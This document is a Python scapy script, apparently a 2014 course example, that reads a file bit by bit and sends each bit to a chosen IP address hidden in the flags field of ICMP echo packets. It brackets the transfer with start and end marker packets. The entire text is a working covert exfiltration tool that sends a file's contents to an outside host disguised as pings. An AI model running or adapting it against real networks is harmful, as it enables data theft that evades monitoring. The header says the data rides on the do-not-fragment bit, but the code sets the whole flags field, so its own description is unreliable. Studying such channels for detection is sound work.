#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
# bit.py
# version 0.1
# Authors: Tahir Khan
# 07-FEB-2014
#
# Description:
# Reads a file bit by bit and sends the data over the do not fragment bit.
#
# -f | --file <input file> The file to read
# -s | --source <IP Address> The Source IP Address
# -d | --destination <IP Address> The Destination IP ADdress
# -h | --help Syntax help
#
# References:
# http://stackoverflow.com/questions/17971398/sending-packets-with-scapy-within-python-environment
# http://www.packetstan.com/2011/04/crafting-overlapping-fragments-finally.html
# http://stackoverflow.com/questions/287871/print-in-terminal-with-colors-using-python
#
# CFRS Example
#
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

import fileinput
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import sys, getopt
import argparse
import signal

class bcolors:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'

	def disable(self):
		self.HEADER = ''
		self.OKBLUE = ''
		self.OKGREEN = ''
		self.WARNING = ''
		self.FAIL = ''
		self.ENDC = ''

def signal_handler(signal, frame):
	print 'Ctrl+C pressed. Exiting.'
	sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def bits(f):
	bytes = (ord(b) for b in f.read())
	for b in bytes:
		for i in xrange(8):
			yield (b >> i) & 1

def main(argv):
	file = ''
	sourceip = ''
	destip = '8.8.8.8'
	begin = '1.1.1.1'
	end = '9.9.9.9'
	#parse the command-line arguments
	parser = argparse.ArgumentParser()
	parser.add_argument('-f', '--file', help='The file to read.', required=True)
	parser.add_argument('-s', '--source', help='The source IP.', required=False)
	parser.add_argument('-d', '--destination', help='The destination IP.', required=True)
	parser.add_argument('-b', '--begin', help='The IP Address to start transmission', required=False)
	parser.add_argument('-e', '--end', help='The IP Address to end transmission', required=False)
	args = parser.parse_args()
	if (args.file):
		file = args.file
#else:
# file = sys.stdin
# stdin = true
	if (args.source):
		sourceip = args.source
	if (args.destination):
		destip = args.destination
	if (args.begin):
		begin = args.begin
	if (args.end):
		end = args.end

	print (bcolors.OKGREEN + "Sending start packet.")

	for x in range (0,16):
		payload = "abcdefghijklmnopqrstuvwabcdefgs"
		ip = IP(dst=begin, proto=1, id=12345, flags=x, frag=1)
		icmp = ICMP(type=8, code=0)
		packet = ip/icmp/payload
		send(packet,verbose=0)

	print (bcolors.OKBLUE + "\tSending data. Total packets: " +  str(os.path.getsize(file) * 8))

#if true:
	for b in bits(open(file, 'r')):
#print b
		payload = "abcdefghijklmnopqrstuvwabcdefg"
		ip = IP(dst=destip, proto=1, id=12345, flags=b)
		icmp = ICMP(type=8, code=0)
		packet = ip/icmp/payload
		send(packet, verbose=0)
#else:

	print (bcolors.OKGREEN + "Sending end packet.")

	for x in range (0,16):
		payload = "abcdefghijklmnopqrstuvwabcdefge"
		ip = IP(dst=end, proto=1, id=12345, flags=x, frag=1)
		icmp = ICMP(type=8, code=0)
		packet = ip/icmp/payload
		send(packet,verbose=0)

main(sys.argv[1:])